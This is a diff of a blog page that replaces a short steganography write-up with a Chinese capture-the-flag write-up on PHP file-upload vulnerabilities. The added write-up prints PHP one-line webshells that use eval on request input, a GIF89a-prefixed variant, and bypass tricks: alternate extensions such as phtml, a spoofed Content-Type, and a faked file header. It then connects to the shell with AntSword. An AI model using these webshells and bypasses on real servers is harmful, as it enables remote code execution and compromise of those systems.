@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Misc1, lunan">
+    <meta name="keywords" content="Web14-文件上传漏洞, lunan">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Misc1 | lunan</title>
+    <title>Web14-文件上传漏洞 | lunan</title>
     <link rel="icon" type="image/png" href="/lunan0320.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/lunan0320.github.io/libs/awesome/css/all.css">
@@ -262,12 +262,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/lunan0320.github.io/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/lunan0320.github.io/medias/featureimages/18.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Misc1</h1>
+                    <h1 class="description center-align post-title">Web14-文件上传漏洞</h1>
                 </div>
             </div>
         </div>
@@ -383,8 +383,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/lunan0320.github.io/tags/Misc/">
-                                <span class="chip bg-color">Misc</span>
+                            <a href="/lunan0320.github.io/tags/Web/">
+                                <span class="chip bg-color">Web</span>
                             </a>
                         
                     </div>
@@ -399,21 +399,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-17
+                    2021-02-22
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-01-17
+                    2021-02-28
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    112
+                    528
                 </div>
                 
 
@@ -440,17 +440,40 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1><span id="misc1">Misc1</span></h1><p>What-is-this wp🤠</p>
-<p>题目来源：攻防世界—misc -进阶题</p>
-<p>   我们先下载附件，发现是一个.gz的压缩包，先解压它，发现里面有两个.jpg的图片文件。</p>
-<p><img src="/lunan0320.github.io/2021/01/17/misc1/1.png"></p>
-<p>​    然后后一次点开两张图片，发现没有什么规律。</p>
-<p>​    <img src="/lunan0320.github.io/2021/01/17/misc1/2.png">!</p>
-<p>​    <img src="/lunan0320.github.io/2021/01/17/misc1/4.png"></p>
-<p>​    根据经验两张图片可能是将他们合并，然后我们使用Stegsolve这个软件的图片合并功能，将图片合并。发现来flag。</p>
-<p>​    </p>
-<p>​    <img src="/lunan0320.github.io/2021/01/17/misc1/3.png"></p>
-
+                <h1><span id="php代码审计之文件上传漏洞">PHP代码审计之文件上传漏洞</span></h1><h3><span id="一-考点">一、考点</span></h3><h4><span id="1-漏洞简介">1、漏洞简介</span></h4><p>​    文件上传漏洞是指用户上传了一个<strong>可执行的脚本文件</strong>，并<strong>通过此脚本文件获得了执行服务器端命令的能力</strong>。这种攻击是最为直接和有效的，“文件上传”本身是没有问题，有问题的是文件上传后，服务器怎么处理，解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果，。</p>
+<h4><span id="2-漏洞条件">2、漏洞条件</span></h4><p> 文件可上传<br> 知道文件上传的路径<br> 上传文件可以被访问<br> 上传文件可以被执行</p>
+<h4><span id="3-某些情况下绕过后缀名检测">3、某些情况下绕过后缀名检测</span></h4><p>php,php3,php4,php5,phtml.pht</p>
+<h4><span id="4-常用一句话木马">4、常用一句话木马</span></h4><pre class=" language-js"><code class="language-js">GIF89a<span class="token operator">?</span> <span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span><span class="token function">eval</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span>shell<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
+<h4><span id="5-文件类型绕过">5、文件类型绕过</span></h4><p>burp抓包对Content-Type修改为image/jpeg</p>
+<h3><span id="二-解题过程">二、解题过程</span></h3><h4><span id="1-尝试上传一句话木马文件后缀名为php">1、尝试上传一句话木马，文件后缀名为php</span></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?></span>
+<span class="token delimiter">&lt;?php</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?></span></code></pre>
+<p>提示说不是图片，需要抓包改文件格式。<strong>将Content-Type里面的格式改为image/jpeg</strong></p>
+<h4><span id="2-绕过后缀名">2、绕过后缀名</span></h4><p>绕过后缀的有文件格式有<strong>php,php3,php4,php5,phtml.pht</strong>，此处经过尝试发现phtml最为合适</p>
+<p>接下来试一下<strong>phtml+修改content-type</strong></p>
+<blockquote>
+<p>phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析</p>
+</blockquote>
+<p><img src="/lunan0320.github.io/2021/02/22/web14-wen-jian-shang-chuan-lou-dong/1.png"></p>
+<p>也许文件头也检查了，<strong>那就加上GIF89a</strong>，发现过滤吊了&lt;?</p>
+<p><img src="/lunan0320.github.io/2021/02/22/web14-wen-jian-shang-chuan-lou-dong/2.png"></p>
+<h4><span id="3-修改一句话木马">3、修改一句话木马</span></h4><p>测试出来发现</p>
+<blockquote>
+<p>后缀名是phtml</p>
+<p>content-type需要改成image/jpeg绕过</p>
+<p>文件头的部分会检查，需要加上GIF89a</p>
+<!--?会被过滤掉
+</blockquote-->
+<p>修改后的一句话木马如下：</p>
+<pre class=" language-javascript"><code class="language-javascript">GIF89a<span class="token operator">?</span> <span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span><span class="token function">eval</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
+<h4><span id="4-bp中修改">4、bp中修改</span></h4><p>修改后需要知道图片的保存路径了。一般都是<strong>upload/filename</strong>，访问一下确实发现了我们上传的文件</p>
+<p><img src="/lunan0320.github.io/2021/02/22/web14-wen-jian-shang-chuan-lou-dong/3.png"></p>
+<h4><span id="5-上传成功后蚁剑连接后台">5、上传成功后蚁剑连接后台</span></h4><p><img src="/lunan0320.github.io/2021/02/22/web14-wen-jian-shang-chuan-lou-dong/4.png"></p>
+<p>此时的密码就是一句话木马中_REQUEST的值，此处为1</p>
+<p>连接成功</p>
+<p>如下</p>
+<p><img src="/lunan0320.github.io/2021/02/22/web14-wen-jian-shang-chuan-lou-dong/5.png"></p>
+<h4><span id="6-flag在根目录里面">6、flag在根目录里面</span></h4><p><img src="/lunan0320.github.io/2021/02/22/web14-wen-jian-shang-chuan-lou-dong/6.png"></p>
+</blockquote>
                 
             </div>
             <hr/>
@@ -476,7 +499,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://lunan0320.github.io/lunan0320.github.io/2021/01/17/misc1/">https://lunan0320.github.io/lunan0320.github.io/2021/01/17/misc1/</a>
+                    <a href="https://lunan0320.github.io/lunan0320.github.io/2021/02/22/web14-wen-jian-shang-chuan-lou-dong/">https://lunan0320.github.io/lunan0320.github.io/2021/02/22/web14-wen-jian-shang-chuan-lou-dong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -514,8 +537,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/lunan0320.github.io/tags/Misc/">
-                                    <span class="chip bg-color">Misc</span>
+                                <a href="/lunan0320.github.io/tags/Web/">
+                                    <span class="chip bg-color">Web</span>
                                 </a>
                             
                         </div>
@@ -563,13 +586,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/lunan0320.github.io/2021/01/17/web1/">
+                <a href="/lunan0320.github.io/2021/02/28/web15-backfile-bei-fen-wen-jian/">
                     <div class="card-image">
                         
                         
-                        <img src="/lunan0320.github.io/medias/featureimages/5.jpg" class="responsive-img" alt="Web1">
+                        <img src="/lunan0320.github.io/medias/featureimages/11.jpg" class="responsive-img" alt="Web15-BackFile备份文件">
                         
-                        <span class="card-title">Web1</span>
+                        <span class="card-title">Web15-BackFile备份文件</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -580,7 +603,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-17
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-28
                         </span>
                         <span class="publish-author">
                             
@@ -608,13 +631,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/lunan0320.github.io/2021/01/11/re5/">
+                <a href="/lunan0320.github.io/2021/02/12/web13-php-xu-lie-hua-yu-fan-xu-lie-hua/">
                     <div class="card-image">
                         
                         
-                        <img src="/lunan0320.github.io/medias/featureimages/10.jpg" class="responsive-img" alt="re5">
+                        <img src="/lunan0320.github.io/medias/featureimages/22.jpg" class="responsive-img" alt="Web13-PHP序列化与反序列化">
                         
-                        <span class="card-title">re5</span>
+                        <span class="card-title">Web13-PHP序列化与反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -625,7 +648,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-12
                             </span>
                         <span class="publish-author">
                             
@@ -638,8 +661,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/lunan0320.github.io/tags/Reverse/">
-                        <span class="chip bg-color">Reverse</span>
+                    <a href="/lunan0320.github.io/tags/Web/">
+                        <span class="chip bg-color">Web</span>
                     </a>
                     
                 </div>
